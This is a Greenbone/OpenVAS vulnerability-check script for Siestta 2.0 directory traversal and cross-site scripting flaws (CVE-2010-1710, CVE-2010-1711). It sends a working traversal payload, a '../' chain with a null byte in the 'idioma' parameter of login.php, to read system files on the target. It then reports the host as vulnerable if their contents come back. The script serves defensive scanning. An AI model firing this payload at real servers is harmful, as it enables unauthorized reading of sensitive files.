if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800769" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-05-13 09:36:55 +0200 (Thu, 13 May 2010)" );
	script_cve_id( "CVE-2010-1710", "CVE-2010-1711" );
	script_bugtraq_id( 39526 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "Siestta Directory Traversal and Cross Site Scripting Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/39453" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/57900" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/12260" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_siestta_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "siestta/detected" );
	script_tag( name: "insight", value: "The flaws are due to the improper validation of user supplied
  data in 'login.php' via 'idioma' parameter and in 'carga_foto_al.php' via
  'usuario' parameter before being used to include files." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Siestta and is prone to directory traversal
  and cross site scripting vulnerabilities." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to obtain
  sensitive information or execute arbitrary code on the vulnerable web server." );
	script_tag( name: "affected", value: "Siestta version 2.0" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
siPort = http_get_port( default: 80 );
siVer = get_kb_item( "www/" + siPort + "/Siestta" );
if(!siVer){
	exit( 0 );
}
siVer = eregmatch( pattern: "^(.+) under (/.*)$", string: siVer );
if(siVer[2] != NULL){
	files = traversal_files();
	for pattern in keys( files ) {
		file = files[pattern];
		url = NASLString( siVer[2], "/login.php?idioma=../../../../../../../../../../../" + file + "%00" );
		sndReq = http_get( item: url, port: siPort );
		rcvRes = http_send_recv( port: siPort, data: sndReq );
		if(egrep( string: rcvRes, pattern: pattern, icase: TRUE )){
			report = http_report_vuln_url( port: siPort, url: url );
			security_message( data: report, port: siPort );
			exit( 0 );
		}
	}
}
exit( 99 );

